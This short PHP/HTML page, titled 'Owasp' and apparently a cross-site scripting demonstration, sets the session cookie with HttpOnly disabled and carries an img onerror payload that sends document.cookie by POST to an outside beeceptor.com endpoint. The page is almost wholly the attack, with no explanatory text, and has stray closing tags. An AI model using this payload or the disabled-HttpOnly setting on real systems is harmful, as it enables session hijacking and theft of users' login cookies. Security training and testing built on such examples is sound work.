<?php
    if (session_start()) {
        setcookie(session_name(), session_id(), null, '/', null, null, false);
    }
?>
<!DOCTYPE html>
<html>
<head>
  <title>Owasp</title>
</head>
<body>
<img src=null onerror="fetch('https://security.free.beeceptor.com/', { method: 'POST', body: document.cookie})" >
</div>

</body>
</html>
</style>
